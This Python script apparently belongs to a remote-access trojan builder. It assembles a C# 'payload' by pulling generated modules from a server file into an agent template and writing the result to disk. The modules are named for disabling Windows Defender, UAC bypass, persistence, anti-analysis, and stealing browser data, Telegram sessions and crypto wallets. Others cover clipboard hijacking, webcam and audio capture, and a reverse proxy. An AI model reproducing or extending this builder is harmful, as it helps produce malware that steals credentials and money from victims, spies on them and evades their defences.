import sys
import os

from server import _generate_anti_analysis_code, _generate_disable_defender_code, _generate_sys_restore_kill_code, _generate_uac_bypass_code, _generate_startup_hide_code, _generate_anti_kill_code, _generate_persistence_code, _generate_clipboard_code, _generate_browser_stealer_code, _generate_telegram_stealer_code, _generate_crypto_wallet_code, _generate_screenshot_on_click_code, _generate_webcam_real_code, _generate_realtime_audio_code, _generate_network_scanner_code, _generate_file_manager_code, _generate_reverse_proxy_code

# Mock out the generator to check C# syntax
with open('c:/Users/danya/Downloads/baron-main/builder/templates/agent.cs', 'r') as f:
    template = f.read()

# Just inject standard vars
template = template.replace('{{HOST}}', 'http://localhost')
template = template.replace('{{CLIENT_ID}}', 'test')

# Grab the mega switch block from server.py manually
with open('c:/Users/danya/Downloads/baron-main/server.py', 'r', encoding='utf-8') as f:
    server_py = f.read()

idx1 = server_py.find('case "ping":')
idx2 = server_py.find('default:\n                    break;', idx1)
switch_cases = server_py[idx1:idx2]

# Add usings
usings = """
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Linq;
using System.Threading;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Management;
"""

final_cs = usings + "\n" + template.replace('{{DISPATCHER}}', switch_cases)

# Add functionalities
funcs = []
funcs.append(_generate_anti_analysis_code())
funcs.append(_generate_disable_defender_code())
funcs.append(_generate_sys_restore_kill_code())
funcs.append(_generate_uac_bypass_code())
funcs.append(_generate_startup_hide_code())
funcs.append(_generate_anti_kill_code())
funcs.append(_generate_persistence_code())
funcs.append(_generate_clipboard_code())
funcs.append(_generate_browser_stealer_code())
funcs.append(_generate_telegram_stealer_code())
funcs.append(_generate_crypto_wallet_code())
funcs.append(_generate_screenshot_on_click_code())
funcs.append(_generate_webcam_real_code())
funcs.append(_generate_realtime_audio_code())
funcs.append(_generate_network_scanner_code())
funcs.append(_generate_file_manager_code())
funcs.append(_generate_reverse_proxy_code())

final_cs = final_cs.replace('{{FUNCTIONS}}', "\n".join(funcs))
final_cs = final_cs.replace('{{CONFIG_MODS}}', '')
final_cs = final_cs.replace('{{STARTUP_MODS}}', '')

with open('tmp_payload.cs', 'w', encoding='utf-8') as f:
    f.write(final_cs)

print("PAYLOAD WRITTEN TO tmp_payload.cs")
